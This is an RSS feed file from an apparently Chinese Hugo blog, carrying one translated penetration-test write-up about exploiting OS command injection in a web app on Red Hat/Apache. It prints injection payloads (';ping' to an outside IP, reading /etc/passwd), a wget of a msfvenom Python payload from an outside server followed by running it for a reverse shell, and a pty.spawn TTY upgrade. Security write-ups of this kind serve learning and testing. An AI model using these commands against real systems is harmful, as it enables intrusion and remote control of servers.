@@ -1,0 +1,98 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>OS命令注入 on 办公AI智能小助手</title>
+        <link>http://localhost:1313/tags/os%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/</link>
+        <description>Recent content in OS命令注入 on 办公AI智能小助手</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-cn</language>
+        <copyright>qife</copyright>
+        <lastBuildDate>Wed, 06 Aug 2025 10:01:27 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/os%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>OS命令注入实战：从挫折到获取Shell的完整历程</title>
+        <link>http://localhost:1313/p/os%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E4%BB%8E%E6%8C%AB%E6%8A%98%E5%88%B0%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%AE%8C%E6%95%B4%E5%8E%86%E7%A8%8B/</link>
+        <pubDate>Wed, 06 Aug 2025 10:01:27 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/os%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E4%BB%8E%E6%8C%AB%E6%8A%98%E5%88%B0%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%AE%8C%E6%95%B4%E5%8E%86%E7%A8%8B/</guid>
+        <description>&lt;h1 id=&#34;os命令注入实战从挫折到获取shell的完整历程&#34;&gt;OS命令注入实战：从挫折到获取Shell的完整历程
+&lt;/h1&gt;&lt;p&gt;Carrie Roberts //&lt;/p&gt;
+&lt;p&gt;OS命令注入非常有趣。最近我在测试某个Web应用时发现了这个漏洞（感谢Burp Suite扫描器）。虽然预感到即将获得shell，但实际过程却比预期困难得多。以下是我的探索历程和技术收获。&lt;/p&gt;
+&lt;h2 id=&#34;初始发现&#34;&gt;初始发现
+&lt;/h2&gt;&lt;p&gt;已知目标运行在Red Hat Linux的Apache服务器上。通过以下注入成功触发外部服务器(1.2.3.4)的ICMP响应，分号用于分隔原始命令：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;ping -c &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 1.2.3.4
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;使用tcpdump验证请求：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcpdump -nni eth0 icmp
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;遇到的障碍&#34;&gt;遇到的障碍
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;32字符长度限制&lt;/strong&gt;：通过反复测试发现命令被截断，推测因数据库存储限制&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;非常规响应机制&lt;/strong&gt;：&lt;code&gt;/etc/passwd&lt;/code&gt;内容意外出现在响应头而非响应体&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;环境限制&lt;/strong&gt;：无netcat可用，但发现Python环境&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;关键技术突破&#34;&gt;关键技术突破
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;响应头注入技巧&lt;/strong&gt;：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n s:&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;which python  &lt;span class=&#34;c1&#34;&gt;# 输出会附加到响应头&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;&lt;strong&gt;Python反弹shell&lt;/strong&gt;：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;使用msfvenom生成payload&lt;/li&gt;
+&lt;li&gt;必须禁用stage编码：&lt;code&gt;set EnableStageEncoding false&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;通过wget传输payload：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget &lt;span class=&#34;s2&#34;&gt;&amp;#34;myserver.net&amp;#34;&lt;/span&gt; -O ~/z
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python ~/z
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;&lt;strong&gt;TTY升级&lt;/strong&gt;：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;python&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;import pty; pty.spawn(&amp;#34;/bin/sh&amp;#34;)&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;经验总结&#34;&gt;经验总结
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;注意非常规输出渠道（如HTTP头）&lt;/li&gt;
+&lt;li&gt;长度限制下需精简命令&lt;/li&gt;
+&lt;li&gt;Python是受限环境中的利器&lt;/li&gt;
+&lt;li&gt;真实环境往往比理论更复杂&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;这就是黑客攻防的本质——看似简单的漏洞，实战中总会遇到意想不到的挑战。&lt;/p&gt;&lt;/blockquote&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
